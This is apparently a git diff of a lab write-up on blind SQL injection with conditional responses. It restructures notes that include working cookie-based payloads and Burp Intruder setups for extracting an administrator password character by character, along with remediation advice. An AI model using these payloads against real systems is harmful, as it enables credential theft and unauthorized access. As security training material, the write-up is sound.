@@ -11,21 +11,47 @@ To solve the lab, log in as the `administrator` user.
 
 ---
 
-## Process
+## Vulnerability Analysis
 
-### 1. Intercepted the GET Request and Sent to Repeater (using Burp Suite)
-```http
-GET /filter?category=Pets HTTP/2
+### Attack Vector Identification
+- **Entry Point**: `TrackingId` cookie parameter
+- **Vulnerability Type**: T1190.001 - SQL Injection: Blind Conditional Response (CWE-89)
+- **Security Flaws:**
+    - User input is embedded directly into SQL queries
+    - Application responds differently based on query results
+
+### Vulnerability Assessment & Exploitation
+
+**Initial Approach:**
+- Intercepted HTTP requests using Burp Suite
+- Identified tracking cookie as potential injection point
+- Performed systematic input validation testing
+
+**Step 1: Testing Boolean Conditions**
+
+Injected a single quote:
+```sql
+'
 ```
+Response: HTTP/2 200 OK (no "Welcome back" message)
 
-### 2. Modified Tracking ID to Test Boolean Conditions
+This indicates the input is being interpreted as part of a SQL string literal.
 
-**Injected Payload 1:**
+Injected escaped quote:
+```sql
+''
+```
+Response: HTTP/2 200 OK (no "Welcome back" message)
+
+This properly closes the string literal, indicating string-based injection is possible.
+
+**Step 2: Verifying Blind Injection**
+
+Tested boolean conditions:
 ```sql
 ' AND 1=1--
 ```
-
-This returned a "Welcome back" message.
+Response: HTTP/2 200 OK with "Welcome back" message
 
 **If the backend SQL query is:**
 ```sql
@@ -42,55 +68,50 @@ Cookie: TrackingId=abc123' AND 1=1--
 SELECT * FROM tracking WHERE id = 'abc123' AND 1=1--';
 ```
 
-Since the injected expression `1=1` is always true, the query executes successfully.
+Since the injected expression `1=1` is always true, the query executes successfully and returns a "Welcome back" message.
 
-**Injected Payload 2:**
 ```sql
 ' AND 1=2--
 ```
+Response: HTTP/2 200 OK without "Welcome back" message
 
-**The Tracking ID becomes:**
-```http
-Cookie: TrackingId=<ID>' AND 1=2--
-```
+This confirms that the application responds differently based on boolean conditions in the injected payload, indicating blind SQL injection vulnerability.
 
-This did not return a "Welcome back" message. This confirms that the query behavior changes based on boolean condition in the injected payload — which means the SQL injection is working and the application is vulnerable to blind SQL injection.
-
-### 3. Verified the Existence of the `users` Table
+**Step 3: Verifying Users Table**
 
 ```sql
 ' AND (SELECT 'a' FROM users LIMIT 1)='a
 ```
+Response: HTTP/2 200 OK with "Welcome back" message
 
-This returned a "Welcome back" message, confirming that a table named `users` exists.
+This confirms the existence of a `users` table in the database.
 
-`LIMIT 1` ensures that the subquery returns exactly one row.
+**Note:** `LIMIT 1` ensures that the subquery returns exactly one row. Without LIMIT, the subquery may return multiple rows, which causes an error in scalar subquery context.
 
-Without LIMIT, `' AND (SELECT 'a' FROM users)='a` the subquery may return multiple rows, which causes an error (will not return the "Welcome back" message). SQL doesn't allow a **scalar subquery** (one used in a comparison like = 'a') to return multiple rows.
+**Note:** No comment sequence (`--`) is needed because:
+- The injected value is already inside a string literal
+- The rest of the query continues cleanly after the injection
+- However, `' AND (SELECT 'a' FROM users LIMIT 1)='a'--` also works
 
-No comment sequence (`--`) is needed because:
-- The injected value is already inside a string literal.
-- The rest of the query continues cleanly after the injection.
-
-However alternatively, `' AND (SELECT 'a' FROM users LIMIT 1)='a'--` also works.
-
-### 4. Verified the `administrator` Username
+**Step 4: Verifying Administrator Username**
 
 ```sql
 ' AND (SELECT 'a' FROM users WHERE username='administrator')='a
 ```
+Response: HTTP/2 200 OK with "Welcome back" message
 
-This returned a "Welcome back" message, confirming there is a user named `administrator`.
+This confirms that a user named `administrator` exists.
 
-Note: `' AND (SELECT username FROM users WHERE username='administrator')='administrator` will also work perfectly.
+**Note:** `' AND (SELECT username FROM users WHERE username='administrator')='administrator` will also work perfectly.
 
 ```sql
 ' AND (SELECT 'a' FROM users WHERE username='administratorhjdf')='a
 ```
+Response: HTTP/2 200 OK without "Welcome back" message
 
-This did not return a "Welcome back" message as expected as there is no user named `administratorhjdf`
+This did not return a "Welcome back" message as expected as there is no user named `administratorhjdf`.
 
-### 5. Determined the Password Length and Sent to Intruder
+**Step 5: Determining Password Length**
 
 ```sql
 ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
@@ -101,89 +122,96 @@ Tried increasing values to identify the password length until the query returned
 ```sql
 ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a
 ```
+Response: HTTP/2 200 OK with "Welcome back" message
 
-This confirmed that the password length is 20.
+This confirms the password is exactly 20 characters long.
 
-> Note: `' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>1)='administrator` will also work perfectly.
+**Note:** `' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>1)='administrator` will also work perfectly.
 
-Alternatively, Intruder can be used to brute force the length(password):
-
+**Alternative Method - Using Intruder:**
 ```sql
 ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
 ```
 
-Send this request to Intruder. In Burp Intruder, select `1` and click the **Add §** button, and with payload tab configuration:
+Send this request to Intruder. In Burp Intruder, select `1` and click the **Add §** button, then configure:
 
-Payload type: numbers
+```sql
+' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>§1§)='a
+```
 
-Payload: 1-40 (step 1)
-
-In the Grep-Match tab (from Settings), search for the value `Welcome back`, and start the Sniper attack.
+Payload type: Numbers
+Payload: 1-40
+Grep-Match: Welcome back
 
 ![burpsuite response](./misc-images/09-2.png)
 
 This will give a "Welcome back" message until 19, indicating the password length is 20.
 
-### 6. Retrieved the Password Using Intruder (Sniper Attack & Cluster Bomb Attack)
+**Step 6: Extracting Password Using Intruder**
 
+**Sniper Attack Method:**
 ```sql
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
 ```
 
-Explanation:
+**Explanation:**
+- `SUBSTRING(string_expression, start_position, length)` is a SQL function used to extract part of a string
+- `password` is the string to extract from
+- Start at position `1` (SQL uses 1-based indexing)
+- Extract `1` character
+- So this returns the first character of the password field
 
-- `SUBSTRING(string_expression, start_position, length)` is a SQL function used to extract part of a string.
-- `password` is the string to extract from.
-- Start at position `1` (SQL uses 1-based indexing).
-- Extract `1` character.
-So this returns the first character of the password field.
-
-In Burp Intruder, select `a` and click the **Add §** button:
-
-```sql
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§`
-```
-
-`§a§` is replaced with each character from the payload list.
-
-Payload tab configuration:
-Payload type: simple list
-Payload set: a-z and 0-9 (assuming no uppercase letters)
-
-In the Grep-Match tab (from Settings), search for the value `Welcome back`, and start the Sniper attack.
-
-This returned a "Welcome back" message only for character `m`, indicating that `m` is the first character of the password.
+**Payload tab configuration:**
+- Payload type: Simple list
+- Payload set: a-z and 0-9 (assuming no uppercase letters)
+- Grep-Match (Settings): Welcome back
 
 ![burpsuite response](./misc-images/09-1.png)
 
+This returned a "Welcome back" message only for character `m`, indicating that `m` is the first character of the password.
+
 Repeated the process for the second character:
 ```sql
-' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='§a§`
+' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='§a§
 ```
 
-This returned a "Welcome back" message only for character `i`, indicating that `i` is the second character.
+This returned a "Welcome back" message only for character `i`, indicating that `i` is the second character of the password.
 
-Repeated the process for all 20 characters and successfully retrieved the complete password.
+Repeated the process for all 20 characters to retrieve the complete password.
 
-Logged in as the administrator using the retrieved password.
-
-Alternatively, `Cluster bomb attack` can be used to retrieve all characters at once:
+**Cluster Bomb Attack Method:**
+```sql
+' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§
+```
 
 ![burpsuite response](./misc-images/09-3.png)
 
-```sql
-' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§`
-```
-
-Payload for `1`: 1-20
-
-Payload for `a`: a-z and 0-9
-
+Payload for position (§1§): 1-20
+Payload for character (§a§): a-z and 0-9
 Grep-Match: Welcome back
 
 ![burpsuite response](./misc-images/09-4.png)
 
-This method retrieves all 20 characters at once making the process simpler but as this has 720 combinations it will take hours with community edition of Burp Suite.
+This method retrieves all 20 characters at once, making the process simpler but requiring 720 combinations which takes hours with the community edition of Burp Suite.
+
+Logged in as the administrator using the password retrieved.
+
+---
+
+## Security Assessment
+
+### Root Cause Analysis
+- Application concatenates user input directly into SQL queries
+- No input validation or sanitization implemented
+- Application responds differently based on query results
+- Parameterized queries (prepared statements) are not used
+
+### Risk Assessment
+| Category | Impact |
+|----------|--------|
+| Confidentiality | High – Sensitive user data exposed |
+| Authentication | High – Credentials leaked character-by-character |
+| Information Disclosure | Medium – Database structure partially revealed |
 
 ---
 
@@ -206,13 +234,15 @@ cursor.execute(query, (tracking_id,))
 
 `?` is a parameter placeholder. It tells the database, "Expect a value here." The value is safely passed as a separate argument to `cursor.execute()`. This prevents it from being executed as SQL. Some DBs like MySQL or Oracle use `%s` or `$1` instead. Click [here](./01-sqli-where-clause.md#notes) for more info.
 
-- Restrict database permissions: The application should connect using a low-privilege database account with access only to the necessary tables and operations. It should not have access to sensitive operations like `SELECT * FROM users`, `DROP`, `UPDATE`, `CREATE`, etc., unless absolutely required.
+- Restrict database permissions using the principle of least privilege.
+
+- Implement consistent response handling that does not reveal information about query execution results.
 
 ---
 
 ## Reflection
 
-Learned how blind SQL injection can be used to extract data character-by-character using conditional responses and boolean logic. Also learned about Sniper attack and cluster bomb attack using Burp Suite.
+This lab demonstrated how blind SQL injection with conditional responses can be used to extract sensitive data through systematic boolean testing. The `SUBSTRING` function proved highly effective in extracting data character-by-character, while the Cluster Bomb attack enabled bulk extraction. Learned the importance of understanding application response patterns and leveraging different Intruder attack types for efficient data extraction.
 
 ---
 
